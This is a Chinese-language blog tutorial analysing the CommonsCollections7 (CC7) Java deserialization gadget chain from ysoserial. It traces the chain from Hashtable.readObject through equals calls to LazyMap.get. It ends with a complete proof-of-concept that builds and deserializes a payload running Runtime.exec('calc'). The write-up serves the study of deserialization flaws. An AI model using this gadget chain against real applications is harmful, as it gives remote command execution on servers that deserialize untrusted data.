---
title: JAVA安全:CC7链
---

*作者：Narcher*	*时间：2024/3/20*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

作为CC链系列的最后一条，当然要放到最后学啦



## 正文

我们先来看一下ysoserial中的CC7链流程：

<img src="JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/1710855641604.png" alt="1710855641604" style="zoom:67%;" />

这里是在LazyMap的get方法之前发生了变化，我们还是按照之前的思路，一点点分析

### 1.AbstractMap部分

从调用get方法的类里边找，找到了AbstractMap类，它的equals方法调用了get方法：

<img src="JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/1710856682591.png" alt="1710856682591" style="zoom: 50%;" />

m对象是我们传入的参数，可控，我们继续向上找

### 2.AbstractMapDecorator部分

<img src="JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/1710856778618.png" alt="1710856778618" style="zoom:67%;" />

发现AbstractMapDecorator类的equals方法调用了equals方法，且其构造器如下：

<img src="JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/1710856824632.png" alt="1710856824632" style="zoom:67%;" />

map参数可控，我们继续往上找

### 3.HashTable部分

<img src="JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/1710856931546.png" alt="1710856931546" style="zoom:67%;" />

HashTable类的reconstitutionPut方法对equals方法进行了调用，看起来流程也很简单，就是对增加的key进行hash计算，如果hash值与tab中的所有元素均不同，就会增加到数组tab中，否则就会报异常

我们再看看调用该方法的部分：

<img src="JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/1710857165911.png" alt="1710857165911" style="zoom: 67%;" />

HashTable类中的readObject方法，看到这里我们就大功告成了，HashTable类完全可以作为链子的结尾。我们来构造链子

### 4.构造链

首先，LazyMap之前的部分由于和CC1链相同，我们就直接copy过来：

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
```

接下来我们按照链子触发的顺序来写链子

#### 4.1 HashTable部分

HashTable的readObject方法会直接用reconstitutionPut方法来读取序列化数据，我们要利用reconstitutionPut方法触发其中的equals方法，就需要进入其for循环的if判断，而且需要if判断的第一个判断（二者hash值相同）通过，因此我们需要至少传入两个hash值相同的LazyMap，那么我们就需要控制LazyMap的key和value值，网上key的hash相同的有yy和zZ或AaAaAa和BBAaBB等，我们随便选一组作为两个LazyMap的key值即可

<img src="JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/image-20240320151803680.png" alt="image-20240320151803680" style="zoom:67%;" />

这里调用的e.key.equals(key)要特别注意一下，e指的是数组tab，e.key的key指的是传入的第一个LazyMap，equals(key)中的key指的是传入的第二个LazyMap，我们就是要用第二个LazyMap触发命令执行

#### 4.2 AbstractMapDecorator部分

由于LazyMap没有equals方法，所以会调用LazyMap的父类AbstractMapDecorator中的equals方法

<img src="JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/image-20240320152111512.png" alt="image-20240320152111512" style="zoom:67%;" />

（这里其实就是把上边的图复制下来了，因为流程是一样的，只是反过来了）

<img src="JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/image-20240320152205265.png" alt="image-20240320152205265" style="zoom:67%;" />

这里我们传入了LazyMap，其this.map指的是LazyMap中传入的HashMap，看不懂的话可以调试一下

之后触发HashMap的equals方法

#### 4.3AbstractMap部分

HashMap也没有equals方法，因此也会调用其父类的equals方法

<img src="JAVA%E5%AE%89%E5%85%A8CC7%E9%93%BE/image-20240320152427981.png" alt="image-20240320152427981" style="zoom:67%;" />

这时里边传入的o对象其实还是我们刚开始传入的第二个LazyMap对象，经过上边的一系列判断便可调用LazyMap的get方法，之后便会触发如同CC1链一样的流程而进行命令执行。

#### 4.4 链子展示

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
HashMap<Object,Object> innerMap1 = new HashMap<>();
HashMap<Object,Object> innerMap2 = new HashMap<>();
Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);
Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
lazyMap1.put("yy",1);
lazyMap2.put("zZ",1);
Hashtable hashtable = new Hashtable();
hashtable.put(lazyMap1, 1);
hashtable.put(lazyMap2, 1);
Class c = chainedTransformer.getClass();
Field iTransformersField = c.getDeclaredField("iTransformers");
iTransformersField.setAccessible(true);
iTransformersField.set(chainedTransformer, transformers);
lazyMap2.remove("yy");
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC7.txt"));
oos.writeObject(hashtable);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC7.txt"));
ois.readObject();
```
